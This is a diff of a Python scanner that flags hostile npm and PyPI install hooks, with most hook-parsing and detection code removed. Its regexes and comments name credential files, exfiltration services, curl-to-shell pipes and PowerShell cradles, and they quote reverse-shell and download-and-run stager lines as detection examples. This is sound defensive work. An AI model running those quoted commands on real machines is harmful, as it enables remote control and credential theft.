-NPM_LIFECYCLE_SCRIPTS = NPM_LOCAL_INSTALL_SCRIPTS   # backwards-compatible name
-PY_LIFECYCLE_SECTIONS = ("build-system", "tool.poetry", "project")
 
-def _sc_install_hook_issue(path, line_no, lines, script, cmd, suspicious, sev=None, redactor=None):
-    sev = sev or ("CRITICAL" if suspicious else "MAJOR")
-    if suspicious:
-        msg = f'"{script}" script runs a network-fetch/eval command at install time.'
+def _sc_install_hook_issue(path, line_no, lines, script, cmd, reasons, sev=None, redactor=None, hint=False):
+    """SC-INSTALL-HOOK for an install hook's command: CRITICAL with the
+    reasons it looks hostile (hook_command_risk), else MAJOR (or `sev`);
+    `hint`: the command runs a download or evaluation tool (INSTALL_HOOK_RE),
+    worth reading, not evidence (0.1.8)."""
+    sev = sev or ("CRITICAL" if reasons else "MAJOR")
+    if reasons:
+        msg = f'"{script}" script {"; and ".join(reasons)}.'
         why = ("Install hooks execute automatically on npm install — the most common "
-               "supply-chain compromise vector — and this one fetches or executes "
-               "remote code.")
+               "supply-chain compromise vector — and this command does what malicious "
+               "install hooks do.")
     else:
-        msg = f'"{script}" script runs code at install time: {cmd!r}.'
+        msg = (f'"{script}" script runs a download or evaluation command at install time: {cmd!r}.' if hint
+               else f'"{script}" script runs code at install time: {cmd!r}.')
         why = ("Install hooks run automatically with user privileges on npm install, "
                "before anyone reviews the package. Many legitimate packages use one "
                "(to fetch a platform binary, for example), so on its own this is a "
@@ -5300,7 +4373,7 @@ def _sc_install_hook_issue(path, line_no, lines, script, cmd, suspicious, sev=No
         if sev == "INFO":
             why = ("A prepare-family script runs on `npm install` in this checkout; it "
                    "is the project's own build step (husky, patch-package, a compile), "
-                   "listed for inventory. Suspicious commands here stay CRITICAL.")
+                   "listed for inventory. Hostile commands here stay CRITICAL.")
     issue = mk_issue(
         {"id": "SC-INSTALL-HOOK", "name": "Install hook", "type": "HOTSPOT",
          "sev": sev, "msg": msg, "why": why,
@@ -5457,6 +4530,15 @@ def load_manifest(path, content, python_literal=False):
     return data, issues
 
 
+def _json_loads_manifest(path, content):
+    """Backwards-compatible wrapper: (data, depth_issue). data is None on any
+    parse failure; depth_issue is SC-MANIFEST-DEPTH for too-deep input.
+    New code uses load_manifest, which also reports unparseable roots."""
+    data, issues = load_manifest(path, content)
+    depth = next((i for i in issues if i["rule"] == "SC-MANIFEST-DEPTH"), None)
+    return data, depth
+
+
 def _load_manifest(path, content, python_literal=False, locate=None):
     """load_manifest, plus -> where: with `locate` (a key), for every dict of
     the result that holds that key, {id(d): (d, offset)} where offset is the
@@ -5578,116 +4660,6 @@ def _ast_key_offsets(tree, data, key, src, base):
     return where
 
 
-def _json_loads_manifest(path, content):
-    """Backwards-compatible wrapper: (data, depth_issue). data is None on any
-    parse failure; depth_issue is SC-MANIFEST-DEPTH for too-deep input.
-    New code uses load_manifest, which also reports unparseable roots."""
-    data, issues = load_manifest(path, content)
-    depth = next((i for i in issues if i["rule"] == "SC-MANIFEST-DEPTH"), None)
-    return data, depth
-
-_NODE_E_RE = re.compile(r"""node\s+-e\s+(?:"((?:\\.|[^"\\])*)"|'((?:\\.|[^'\\])*)'|(\S+))""")
-_LOCAL_REQUIRE_RE = re.compile(r"""require\(\s*\\?["'](\.{1,2}/[^"'\\]+)\\?["']\s*\)""")
-_INLINE_DANGER_RE = re.compile(
-    r"https?|fetch|child_process|exec|spawn|eval|Function|Buffer|atob|base64|net\.|dgram|process\.env")
-
-
-def _hook_is_suspicious(cmd):
-    """Does an install-hook command fetch or evaluate code? `node -e` alone is
-    not evidence: core-js's `node -e "try{require('./postinstall')}catch(e){}"`
-    only loads a file shipped in the package (which is scanned like any other)."""
-    if not INSTALL_HOOK_RE.search(cmd):
-        return False
-    remainder = cmd
-    for m in _NODE_E_RE.finditer(cmd):
-        code = next(g for g in m.groups() if g is not None)
-        if _LOCAL_REQUIRE_RE.search(code) and not _INLINE_DANGER_RE.search(
-                _LOCAL_REQUIRE_RE.sub("", code)):
-            remainder = remainder.replace(m.group(0), " ")
-    return bool(INSTALL_HOOK_RE.search(remainder))
-
-
-# ---- Following a hook command to the files it runs (registry) ----
-_HOOK_SEPARATORS = {"&&", "||", ";", "|", "&", "(", ")", ";;", "|&"}
-_HOOK_REDIRECTS = {">", ">>", "<", "<<", ">&", "<&", "&>", ">|"}
-_HOOK_WRAPPERS = {"env", "cross-env", "exec", "command", "nohup", "time", "nice", "sudo",
-                  "cross-env-shell", "dotenv"}
-_NODE_NAMES = {"node", "nodejs", "node.exe"}
-_SHELL_NAMES = {"sh", "bash", "dash", "zsh", "ksh", "ash", "sh.exe", "bash.exe"}
-_PYTHON_NAME_RE = re.compile(r"^(?:python(?:\d+(?:\.\d+)?)?|py)(?:\.exe)?$", re.I)
-_NODE_CODE_FLAGS = {"-e", "--eval", "-p", "--print"}
-_NODE_PRELOAD_FLAGS = {"-r", "--require", "--import", "--loader", "--experimental-loader"}
-_NODE_VALUE_FLAGS = _NODE_PRELOAD_FLAGS | {"-C", "--conditions", "--input-type", "--env-file",
-                                           "--title", "--inspect-port", "--redirect-warnings",
-                                           "--report-dir", "--diagnostic-dir", "--cpu-prof-dir",
-                                           "--heap-prof-dir", "--watch-path"}
-_SCRIPT_EXT_RE = re.compile(r"\.(?:c|m)?js$|\.sh$|\.py$", re.I)
-_ENV_ASSIGN_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
-
-
-_HOOK_FALLBACK_TOKEN_RE = re.compile(r"&&|\|\||[;|&()]|[^\s;|&()]+")
-
-
-def _hook_tokens(cmd):
-    """Shell-like tokenization of an npm script: quotes respected, operators
-    (&& || ; | & parentheses) as their own tokens. Never raises."""
-    import shlex
-    try:
-        lex = shlex.shlex(cmd, posix=True, punctuation_chars=True)
-        lex.whitespace_split = True
-        lex.commenters = ""
-        return list(lex)
-    except ValueError:                     # unbalanced quotes: best effort
-        return _HOOK_FALLBACK_TOKEN_RE.findall(cmd)
-
-
-def _local_module(value):
-    return bool(value) and (value.startswith(("./", "../", "/")) or bool(_SCRIPT_EXT_RE.search(value)))
-
-
-def _node_script(args):
-    """-> (script, preloads, code) for `node [flags] script [args]`: code is
-    the inline code of -e / --eval / -p / --print (None when there is none)."""
-    preloads, i = [], 0
-    while i < len(args):
-        a = args[i]
-        if a == "--":
-            return (args[i + 1] if i + 1 < len(args) else None), preloads, None
-        if a.startswith("-") and a != "-":
-            name, eq, val = a.partition("=")
-            if name in _NODE_CODE_FLAGS:
-                return None, preloads, (val if eq else (args[i + 1] if i + 1 < len(args) else ""))
-            if name in _NODE_VALUE_FLAGS:
-                value = val if eq else (args[i + 1] if i + 1 < len(args) else "")
-                if name in _NODE_PRELOAD_FLAGS and _local_module(value):
-                    preloads.append(value)
-                i += 1 if eq else 2
-                continue
-            i += 1
-            continue
-        return a, preloads, None
-    return None, preloads, None
-
-
-def _interpreter_script(args, inline_flags=("-c",)):
-    """-> (script, inline_code) for `sh|python [flags] script` / `-c code`."""
-    i = 0
-    while i < len(args):
-        a = args[i]
-        if a in inline_flags:
-            return None, (args[i + 1] if i + 1 < len(args) else "")
-        if a == "-m" and i + 1 < len(args):                     # python -m pkg.mod
-            return args[i + 1].replace(".", "/") + ".py", None
-        if a in ("-o", "-O", "-W", "-X") and i + 1 < len(args):
-            i += 2
-            continue
-        if a.startswith("-") and a != "-":
-            i += 1
-            continue
-        return a, None
-    return None, None
-
-
 # Following a hook is bounded (review: a 16 MB hook of `cd a;` took hours, one
 # of `env ` minutes, and one of `cd a && node b.js && …` made gigabytes of
 # targets): a hook longer than HOOK_MAX_CHARS is not followed, at most
@@ -5699,236 +4671,22 @@ HOOK_MAX_CHARS = 100_000
 HOOK_MAX_COMMANDS = 1000
 HOOK_MAX_TARGETS = 100
 HOOK_MAX_PATH = 4096
-_REDIRECT_TOKEN_RE = re.compile(r"\d?[<>]{1,2}&?\d?")
-_DUP_FD_RE = re.compile(r"&\d$")
-_FD_NUMBER_RE = re.compile(r"[0-9]+")
-# A wrapper's options that take a value (the next word, `--name=value`, or the
-# rest of a short option: `-Cdir`), the ones among them that change the
-# directory the command runs in, and those whose value is a command line.
-_WRAPPER_VALUE_OPTIONS = {
-    "env": frozenset({"-u", "--unset", "-C", "--chdir", "-S", "--split-string"}),
-    "sudo": frozenset({"-u", "--user", "-g", "--group", "-h", "--host", "-p", "--prompt",
-                       "-C", "--close-from", "-D", "--chdir", "-r", "--role", "-t", "--type",
-                       "-T", "--command-timeout", "-U", "--other-user"}),
-    "nice": frozenset({"-n", "--adjustment"}),
-    "exec": frozenset({"-a"}),
-    "time": frozenset({"-f", "--format", "-o", "--output"}),
-    "dotenv": frozenset({"-e", "-v", "-p"}),
-}
-_WRAPPER_CHDIR_OPTIONS = {"env": frozenset({"-C", "--chdir"}), "sudo": frozenset({"-D", "--chdir"})}
-_WRAPPER_COMMAND_OPTIONS = {"env": frozenset({"-S", "--split-string"})}
-
-
-class _HookWalk:
-    """What following one hook has used, and whether a limit stopped it."""
-    __slots__ = ("commands", "complete")
-
-    def __init__(self):
-        self.commands, self.complete = 0, True
-
-
-def _apply_path(comps, path):
-    """posixpath.normpath's loop for relative `path`, applied to the list of
-    components kept so far (in place): '' and '.' are dropped, and '..'
-    removes the component before it unless there is none or it is '..' too.
-    normpath(a + '/' + b) is b applied to a's components, so a `cd` costs only
-    its own length (the whole path was normalized again at every one)."""
-    for comp in path.split("/"):
-        if comp in ("", "."):
-            continue
-        if comp != ".." or not comps or comps[-1] == "..":
-            comps.append(comp)
-        else:
-            comps.pop()
-    return comps
-
-
-def _hook_cd(where, dest):
-    """The directory after `cd dest` from `where` ((set, components): set is
-    False while no `cd` has named a directory), or None for a destination
-    the walk cannot follow (~, -, $VAR). An absolute path counts from the
-    package root."""
-    if not dest or dest in ("~", "-") or dest.startswith(("$", "~")):
-        return None
-    dest = dest.replace("\\", "/")
-    if dest.startswith("/"):
-        raw = dest.lstrip("/")
-        return raw not in ("", "."), _apply_path([], raw)
-    comps = _apply_path(list(where[1]), dest)
-    return bool(comps), comps
-
-
-def _hook_segment_targets(tokens, depth, walk):
-    """Targets of one tokenized command line; tracks `cd` across segments."""
-    targets = []
-    state = (False, [])                       # the directory `cd` moved to
-    joined = {}
-
-    def join(path, where=None):
-        """core's normpath(join(cwd, path)) when a `cd` has set a directory
-        (`where`: this command's own, from env -C / sudo -D)."""
-        path = path.replace("\\", "/")
-        is_set, comps = where if where is not None else state
-        if not is_set or path.startswith("/"):
-            return path
-        if where is not None:
-            return "/".join(_apply_path(list(comps), path)) or "."
-        if path not in joined:              # (cleared at every cd)
-            joined[path] = "/".join(_apply_path(list(comps), path)) or "."
-        return joined[path]
-
-    def flush(seg):
-        nonlocal state
-        words, skip = [], False
-        for tok in seg:
-            if skip:
-                skip = False
-                continue
-            if tok in _HOOK_REDIRECTS or _REDIRECT_TOKEN_RE.fullmatch(tok):
-                skip = not _DUP_FD_RE.search(tok)
-                if words and _FD_NUMBER_RE.fullmatch(words[-1]):
-                    words.pop()                 # 2>/dev/null: the 2 is the redirect's
-                continue
-            words.append(tok)
-        if not words:
-            return
-        if walk.commands >= HOOK_MAX_COMMANDS:
-            walk.complete = False
-            return
-        walk.commands += 1
-        # env assignments and wrappers (with their options) in front
-        i, where = 0, None
-        while i < len(words):
-            word = words[i]
-            if _ENV_ASSIGN_RE.match(word):
-                i += 1
-                continue
-            name = word.lower()
-            if name not in _HOOK_WRAPPERS:
-                break
-            i += 1
-            values = _WRAPPER_VALUE_OPTIONS.get(name, frozenset())
-            while i < len(words) and words[i].startswith("-") and (words[i] != "-" or name == "env"):
-                opt = words[i]
-                i += 1
-                if opt == "--":
-                    break
-                if opt.startswith("--"):
-                    key, eq, value = opt.partition("=")
-                    if key not in values:
-                        continue
-                    if not eq:
-                        value = words[i] if i < len(words) else ""
-                        i += 1
-                elif opt[:2] in values:
-                    key, value = opt[:2], opt[2:]
-                    if not value:
-                        value = words[i] if i < len(words) else ""
-                        i += 1
-                else:
-                    continue
-                if key in _WRAPPER_CHDIR_OPTIONS.get(name, ()):
-                    where = _hook_cd(where or state, value) or where
-                elif key in _WRAPPER_COMMAND_OPTIONS.get(name, ()):
-                    if depth < 2:                   # env -S "node x.js": a command line
-                        targets.extend(join(t, where) for t in _hook_targets(value, depth + 1, walk))
-                    return
-        if i >= len(words):
-            return
-        head = words[i].replace("\\", "/")
-        base = head.rsplit("/", 1)[-1].lower()
-        if base in ("cd", "pushd"):
-            dest = next((w for w in words[i + 1:] if not w.startswith("-")), "")
-            moved = _hook_cd(state, dest)
-            if moved is not None:
-                state = moved
-                joined.clear()
-            return
-        script, extra, code = None, [], None
-        if base in _NODE_NAMES:
-            script, extra, code = _node_script(words[i + 1:])
-        elif base in _SHELL_NAMES or _PYTHON_NAME_RE.match(base):
-            script, inline = _interpreter_script(words[i + 1:])
-            if inline and depth < 2 and base in _SHELL_NAMES:
-                targets.extend(join(t, where) for t in _hook_targets(inline, depth + 1, walk))
-        elif head.startswith(("./", "../")) or ("/" in head and not head.startswith("/")) \
-                or _SCRIPT_EXT_RE.search(head):
-            script = head                       # executed directly (shebang)
-        for t in [script] + extra:
-            if t:
-                targets.append(join(t, where))
-        if code:                                # node -e "require('./x')", from this directory
-            targets.extend(join(m.group(1), where) for m in _LOCAL_REQUIRE_RE.finditer(code))
-
-    seg = []
-    for tok in tokens:
-        if tok in _HOOK_SEPARATORS or (tok and set(tok) <= set(";&|()")):
-            flush(seg)
-            seg = []
-        else:
-            seg.append(tok)
-    flush(seg)
-    return targets
-
-
-def _hook_targets(cmd, depth=0, walk=None):
-    walk = walk if walk is not None else _HookWalk()
-    targets = []
-    variants = [cmd]
-    if "\\" in cmd:
-        variants.append(cmd.replace("\\", "/"))   # cmd.exe: backslash is a path separator
-    for variant in variants:
-        targets += _hook_segment_targets(_hook_tokens(variant), depth, walk)
-    return targets
-
-
-def follow_hook(cmd):
-    """(targets, complete) for an install hook command: the package-relative
-    files it runs, in order and without duplicates — `node install.js`,
-    `node ./scripts/x.mjs`, `node install` (no extension: resolve like Node),
-    `node --no-warnings x.js`, `node -r ./preload.js x.js`,
-    `cd scripts && node x.js`, `sh ./install.sh`, `./install.sh`,
-    `python setup_helper.py`, `node scripts\\x.js`,
-    `node -e "require('./postinstall')"`, `env -C sub node x.js`,
-    `sudo -u me node x.js`, `2>/dev/null node x.js` — and False for complete
-    when a limit stopped the walk (see HOOK_MAX_CHARS). The command is
-    tokenized like a shell (quotes, && || ; | operators, env assignments,
-    cd, wrappers and their options)."""
-    if not isinstance(cmd, str) or not cmd.strip():
-        return [], True
-    if len(cmd) > HOOK_MAX_CHARS:
-        return [], False
-    walk = _HookWalk()
-    targets = _hook_targets(cmd, 0, walk)
-    # `node -e` anywhere in the command (`npx node -e …` too), as written
-    for m in _NODE_E_RE.finditer(cmd):
-        code = next(g for g in m.groups() if g is not None)
-        targets += _LOCAL_REQUIRE_RE.findall(code)
-    seen, out = set(), []
-    for t in targets:
-        if t and t not in seen and t not in ("-", "."):
-            if len(t) > HOOK_MAX_PATH:
-                walk.complete = False
-                continue
-            seen.add(t)
-            out.append(t)
-    if len(out) > HOOK_MAX_TARGETS:
-        out, walk.complete = out[:HOOK_MAX_TARGETS], False
-    return out, walk.complete
-
-
-def hook_script_targets(cmd):
-    """The files an install hook runs (follow_hook's targets)."""
-    return follow_hook(cmd)[0]
 
 
 # ---------------- Install-script and import-time inspection ----------------
-# (The registry's tests, here so that --deps project scans run them too.)
+# (The registry's tests, here so that --deps project scans run them too. The
+# tests themselves are the native engine's since the Rust-first refactor:
+# install_script_risk and import_time_risk above. What stays here are the
+# values the registry and the workflow checks read, which
+# make_rust_tables.py --check holds equal to the rule pack's.)
 # An install hook is a capability; what makes it hostile is what the script it
 # runs does. Escalate only on the patterns malicious install scripts share:
-# shipping environment/credential data over the network, or talking to
-# throwaway exfiltration endpoints. Downloading a platform binary from the
-# registry (esbuild, puppeteer) is not either. The same test applies to the
+# data read from the machine sent over the network (0.1.8: read as a flow;
+# a throwaway exfiltration endpoint the script names labels where it goes),
+# code fetched and run, a reverse shell, persistence. Downloading a platform
+# binary from the registry (esbuild, puppeteer) is none of these, and in
+# JavaScript or Python a command is what an exec call is handed (a CLI's
+# help text or an error message that shows `curl … | sh` runs nothing). The same test applies to the
 # Python code pip runs at install time (an sdist's setup.py, an in-tree PEP 517
 # backend) and to shell scripts a hook runs.
 _NETWORK_RE = re.compile(
@@ -5950,17 +4708,6 @@ _NETWORK_RE = re.compile(
     r"""|\b(?:curl|wget)\s+(?:-{1,2}\w[\w-]*(?:=\S*|\s+(?!-{1,2}\w)(?!["']?https?:)\S+)?\s+){0,24}"""
     r"""["']?https?://"""
     r"""|\b(?:nc|ncat|netcat)\s+(?:-\w+\s+){0,8}[\w.-]+\s+\d{2,5}\b|/dev/tcp/""", re.M)
-_SECRET_SOURCE_RE = re.compile(
-    r"""JSON\.stringify\(\s*process\.env|Object\.(?:keys|entries|values)\(\s*process\.env|"""
-    r"""\.npmrc|[/\\]\.ssh\b|~/\.ssh\b|id_rsa|id_ed25519|\.aws[/\\]|~/\.aws\b|\.git-credentials|"""
-    r"""\.docker[/\\]config\.json|\.kube[/\\]config|Local Storage[/\\]leveldb|\.pypirc|\.netrc\b|"""
-    # Python: the whole environment, not one variable
-    r"""\bdict\(\s*os\.environ\s*\)|\bos\.environ\.(?:items|keys|values|copy)\(\s*\)|"""
-    r"""json\.dumps\(\s*(?:dict\(\s*)?os\.environ|\b(?:str|repr)\(\s*os\.environ\s*\)|"""
-    r"""\{\s*\*\*\s*os\.environ|\burlencode\(\s*(?:dict\(\s*)?os\.environ|\bos\.environb\b"""
-    # shell: the whole environment piped or redirected somewhere
-    r"""|(?:^|[\s;&(`])(?:env|printenv|set)\s*(?:\|(?!\|)|>)|\$\(\s*(?:env|printenv)\s*\)|`\s*(?:env|printenv)\s*`""",
-    re.I | re.M)
 # RequestBin by its host names only (0.1.8): the bare word is also the start
 # of requestBinary(), which chromedriver's and phantomjs-prebuilt's installers
 # define to download their binaries.
@@ -5969,7 +4716,6 @@ _EXFIL_SERVICES = (
     r"""discord(?:app)?\.com/api/webhooks|api\.telegram\.org|oastify\.com|burpcollaborator|"""
     r"""\binteract\.sh|\boast\.(?:pro|live|site|online|fun|me)\b|requestbin\.(?:com|net|io)\b|\brequestb\.in\b|"""
     r"""pipedream\.net|transfer\.sh|\.onion\b""")
-_EXFIL_DEST_RE = re.compile(r"""https?://(?:\d{1,3}\.){3}\d{1,3}\b|""" + _EXFIL_SERVICES, re.I)
 _EXFIL_SERVICE_RE = re.compile(_EXFIL_SERVICES, re.I)      # the named ones, no raw IPs
 # `curl … | sh` / `wget … | bash`, read in one left-to-right pass: a pipe into
 # a shell after curl or wget in the same command (no `|`, `;`, `&` or line
@@ -5977,1413 +4723,6 @@ _EXFIL_SERVICE_RE = re.compile(_EXFIL_SERVICES, re.I)      # the named ones, no 
 # rescanned the rest of the command from every `curl`, so a line of 100,000
 # of them never finished.
 _PIPE_SCAN_RE = re.compile(r"""\|\s*(?:sudo\s+)?(?:ba|z|da|k)?sh\b|[\n|;&]|\b(?:curl|wget)\b""")
-
-
-def _pipes_download_to_shell(text):
-    download = False
-    for m in _PIPE_SCAN_RE.finditer(text):
-        token = m.group(0)
-        if token[0] == "|" and len(token) > 1:           # | sh, | sudo bash
-            if download:
-                return True
-            download = False
-        elif token in ("\n", "|", ";", "&"):
-            download = False
-        else:                                            # curl / wget
-            download = True
-    return False
-
-
-# A download handed to a shell or an interpreter without a pipe: through a
-# command substitution (`sh -c "$(curl …)"`, `node -e "$(curl …)"`,
-# `eval "$(wget -qO- …)"`) or a process substitution (`source <(curl …)`,
-# `bash <(curl …)`). Read one row at a time, as a command is; a row with no
-# `$(curl`, `` `curl `` or `<(curl` (or wget) is not searched.
-_DL_SUBST_RE = re.compile(
-    r"""\b(?:(?:ba|z|da|k)?sh|node(?:js)?|bun|python[\d.]*|perl|ruby|php|pwsh|powershell)(?:\.exe)?"""
-    r"""(?:[ \t]+-[\w-]+){0,6}?[ \t]+-(?:c|e|E|p|r|-eval|-print|Command|command)[ \t]+(?:["'][ \t]*)?"""
-    r"""(?:\$\(|`)[ \t]*(?:curl|wget)\b"""
-    r"""|\beval[ \t]+(?:["'][ \t]*)?(?:\$\(|`)[ \t]*(?:curl|wget)\b"""
-    r"""|(?:\b(?:(?:ba|z|da|k)?sh|source|node(?:js)?|python[\d.]*)|(?:^|[ \t;&|(])\.)[ \t]+<\([ \t]*(?:curl|wget)\b""")
-_DL_SUBST_NEEDLE_RE = re.compile(r"""(?:\$\(|`|<\()[ \t]*(?:curl|wget)""")
-
-
-def runs_substituted_download(row):
-    """Does this row hand a download to a shell or an interpreter through a
-    command or process substitution (see above)?"""
-    return (("curl" in row or "wget" in row) and _DL_SUBST_NEEDLE_RE.search(row) is not None
-            and _DL_SUBST_RE.search(row) is not None)
-
-
-# the reason each received-code category adds (see _received_code_kind)
-_DL_CATEGORY_REASON = {
-    "run": "runs code it receives over the network",
-    "deserialize": "deserializes data it receives over the network",
-    "import": "loads a module named by data it receives over the network",
-}
-
-
-# ---------------- PowerShell, stagers, reverse shells, host information ----------------
-# The install-script blind spots of the audit's PyPI benchmark (0.1.7), each a
-# shape a legitimate install script has no use for:
-#
-# * PowerShell started with an encoded command (-EncodedCommand, or any prefix
-#   PowerShell accepts: -e, -ec, -enc, …; base64 of UTF-16LE text): 68 of 200
-#   malicious PyPI packages ran `powershell -WindowStyle Hidden -EncodedCommand
-#   …` from setup.py to fetch an .exe from Discord's CDN and start it. The
-#   command is decoded, and what it does is named when it downloads and runs
-#   code. Plain PowerShell that downloads and runs code — a cradle (`irm URL |
-#   iex`, `IEX (New-Object Net.WebClient).DownloadString(URL)`) or a download
-#   written to a file and started (`Invoke-WebRequest -OutFile f` then
-#   `Start-Process f`) — is the same thing unencoded.
-# * A script carried in a string literal that downloads and runs code: a
-#   setup.py that writes `b"""from urllib.request import urlopen as u;exec(u(
-#   'https://…').read())"""` to a temporary file and starts it with pythonw.
-#   The literal's text is read as code (its `;`-separated statements one per
-#   line) by the received-code test.
-# * A reverse shell: a socket's descriptor made a shell's standard streams
-#   (`os.dup2(s.fileno(), 0)` … `subprocess.call(["/bin/sh", "-i"])`),
-#   `bash -i >& /dev/tcp/HOST/PORT 0>&1`, `nc -e /bin/sh`, or a spawned shell
-#   piped to a net.Socket.
-# * The machine's user or host name (or the output of whoami, hostname,
-#   ifconfig …) collected in a script that sends data over the network: the
-#   dependency-confusion beacon.
-_PS_RE = re.compile(r"\b(?:powershell|pwsh)(?:\.exe)?\b", re.I)
-_PS_ENCODED_RE = re.compile(
-    r"\b(?:powershell|pwsh)(?:\.exe)?\b[^\n]{0,400}?[\s\"',\[(][-/\u2013\u2014]"
-    r"(?:encodedcommand|encodedcomman|encodedcomma|encodedcomm|encodedcom|encodedco|encodedc|encoded|encode"
-    r"|encod|enco|enc|en|ec|e)[\s\"',]+([A-Za-z0-9+/]{16}[A-Za-z0-9+/]*={0,2})", re.I)
-_PS_ENCODED_MAX = 65536          # base64 characters of one command that are decoded
-_PS_CRADLE_RE = re.compile(
-    r"\b(?:iwr|irm|Invoke-WebRequest|Invoke-RestMethod|curl|wget)\b[^\n|;]{0,400}\|\s*(?:iex|Invoke-Expression)\b"
-    r"|\b(?:iex|Invoke-Expression)\b[\s(]{0,8}(?:New-Object\s+(?:System\.)?Net\.WebClient\s*\)\s*\.\s*DownloadString"
-    r"|iwr|irm|Invoke-WebRequest|Invoke-RestMethod)\b"
-    r"|\.DownloadString\s*\([^\n)]{0,400}\)\s*\|\s*(?:iex|Invoke-Expression)\b", re.I)
-_PS_DOWNLOAD_FILE_RE = re.compile(
-    r"\b(?:Invoke-WebRequest|iwr|Invoke-RestMethod|irm|curl(?:\.exe)?|wget|Start-BitsTransfer)\b[^\n]{0,400}?"
-    r"\s-(?:OutFile|Destination|o)\b|\.DownloadFile\s*\(", re.I)
-_PS_START_RE = re.compile(r"\b(?:Start-Process|saps|Invoke-Item|Invoke-Expression|iex)\b", re.I)
-
-
-def _powershell_script_risk(ps):
-    """What PowerShell text `ps` does that an install script should not:
-    'downloads and runs code' or None."""
-    if _PS_CRADLE_RE.search(ps) or (_PS_DOWNLOAD_FILE_RE.search(ps) and _PS_START_RE.search(ps)):
-        return "downloads and runs code"
-    return None
-
-
-def _decode_powershell(b64):
-    """The UTF-16LE text of an -EncodedCommand argument ('' when it is not
-    base64): the first _PS_ENCODED_MAX characters, padded, an odd last byte
-    dropped."""
-    b64 = b64[:_PS_ENCODED_MAX]
-    b64 = b64[:len(b64) - len(b64) % 4] if b64.endswith("=") else b64 + "=" * (-len(b64) % 4)
-    try:
-        data = base64.b64decode(b64, validate=True)
-    except (ValueError, TypeError):
-        return ""
-    return data[:len(data) // 2 * 2].decode("utf-16-le", "replace")
-
-
-def powershell_risk(text):
-    """Reasons PowerShell in `text` looks hostile (see above), [] if none."""
-    if not _PS_RE.search(text):
-        return []
-    reasons = []
-    for m in _PS_ENCODED_RE.finditer(text):
-        does = _powershell_script_risk(_decode_powershell(m.group(1)))
-        reasons.append("runs an encoded PowerShell command" + (f" that {does}" if does else ""))
-        break
-    if not reasons:
-        does = _powershell_script_risk(text)
-        if does:
-            reasons.append(f"runs PowerShell that {does}")
-    return reasons
-
-
-_STAGER_MIN = 24                 # characters of a literal worth reading as a script
-_STAGER_MAX_LITERALS = 2000      # literals examined per text
-_STAGER_RUN_NEEDLES = ("exec", "eval", "Function", "system", "popen", "spawn", "-c")
-_STAGER_NET_NEEDLES = ("urlopen", "requests", "urllib", "http", "fetch", "curl", "wget", "socket")
-
-
-def _string_literals(text):
-    """(offset, contents) of the string literals of `text` ('…', "…", `…`
-    and Python's triple-quoted forms; escapes are skipped, not decoded; a
-    one-quote literal ends at its line), in order, at most
-    _STAGER_MAX_LITERALS of them. One pass."""
-    out, i, n = [], 0, len(text)
-    while i < n and len(out) < _STAGER_MAX_LITERALS:
-        ch = text[i]
-        if ch not in "\"'`":
-            i += 1
-            continue
-        if ch != "`" and text.startswith(ch * 3, i):
-            j = text.find(ch * 3, i + 3)
-            end = n if j < 0 else j
-            out.append((i, text[i + 3:end]))
-            i = end + 3
-            continue
-        j = i + 1
-        while j < n and text[j] != ch and (ch == "`" or text[j] != "\n"):
-            j += 2 if text[j] == "\\" else 1
-        out.append((i, text[i + 1:min(j, n)]))
-        i = j + 1
-    return out
-
-
-def stager_at(text):
-    """The offset of a string literal of `text` that holds a script that
-    downloads and runs code (see above), else -1."""
-    if not any(nd in text for nd in _STAGER_NET_NEEDLES):
-        return -1
-    for at, lit in _string_literals(text):
-        if (len(lit) >= _STAGER_MIN and any(nd in lit for nd in _STAGER_RUN_NEEDLES)
-                and any(nd in lit for nd in _STAGER_NET_NEEDLES)):
-            found = _received_code_kind(lit.replace(";", "\n"))
-            if found is not None and found[1] == "run":
-                return at
-    return -1
-
-
-_REVSHELL_DUP2_RE = re.compile(r"\bdup2\s*\(\s*[\w.]+\.fileno\s*\(\s*\)\s*,\s*[012]\s*\)")
-_REVSHELL_SHELL_RE = re.compile(r"""["'](?:/bin/(?:ba|z|da|k)?sh|cmd(?:\.exe)?|powershell(?:\.exe)?)["']|\bpty\.spawn\s*\(""")
-_REVSHELL_LINE_RE = re.compile(
-    r"\b(?:ba|z|k)?sh\s+-i\b[^\n]{0,80}?[<>]&?\s*/dev/(?:tcp|udp)/"
-    r"|/dev/(?:tcp|udp)/[\w.\-]+/\d+[^\n]{0,40}?0\s*>\s*&\s*1"
-    r"|\b(?:nc|ncat|netcat)\b[^\n]{0,120}?\s-[ec]\s+[\"']?(?:/bin/)?(?:ba|z)?sh\b")
-_REVSHELL_JS_SPAWN_RE = re.compile(r"""\bspawn\s*\(\s*["'](?:/bin/(?:ba|z)?sh|cmd(?:\.exe)?)["']""")
-_REVSHELL_JS_PIPE_RE = re.compile(r"\.pipe\s*\(\s*[\w$.]+\.stdin\s*\)")
-_REVSHELL_JS_NET_RE = re.compile(r"\bnet\s*\.\s*(?:Socket|connect|createConnection)\b|\bnew\s+Socket\s*\(")
-
-
-def reverse_shell_at(text):
-    """The offset where `text` opens a reverse shell (see above), else -1."""
-    m = _REVSHELL_LINE_RE.search(text)
-    if m:
-        return m.start()
-    if "dup2" in text:
-        m = _REVSHELL_DUP2_RE.search(text)
-        if m and _REVSHELL_SHELL_RE.search(text):
-            return m.start()
-    if "pty" in text and "socket" in text and "connect" in text and "pty.spawn" in text:
-        return text.index("pty.spawn")
-    if "spawn" in text:
-        m = _REVSHELL_JS_SPAWN_RE.search(text)
-        if m and _REVSHELL_JS_PIPE_RE.search(text) and _REVSHELL_JS_NET_RE.search(text):
-            return m.start()
-    # an argument list (`spawn('nc', [host, port, '-e', '/bin/sh'])`), or a
-    # shell or netcat run with an ngrok TCP address (0.1.8)
-    if any(nd in text for nd in _REVSHELL_ARGS_NEEDLES):
-        m = _REVSHELL_ARGS_RE.search(text)
-        if m:
-            return m.start()
-    if any(nd in text for nd in _REVSHELL_NGROK_NEEDLES):
-        m = _REVSHELL_NGROK_TCP_RE.search(text)
-        if m and _REVSHELL_ARG_SHELL_RE.search(text) and _EXEC_CALL_RE.search(text):
-            return m.start()
-    return -1
-
-
-_HOST_INFO_RE = re.compile(
-    r"\b(?:socket\.gethostname|socket\.getfqdn|platform\.node|getpass\.getuser|os\.getlogin|pwd\.getpwuid"
-    r"|os\.hostname|os\.userInfo)\s*\("
-    r"""|\b(?:getoutput|check_output|getstatusoutput|execSync|popen)\s*\(\s*\[?\s*["'](?:whoami|hostname|id|uname"""
-    r"""|ifconfig|ipconfig|systeminfo)\b"""
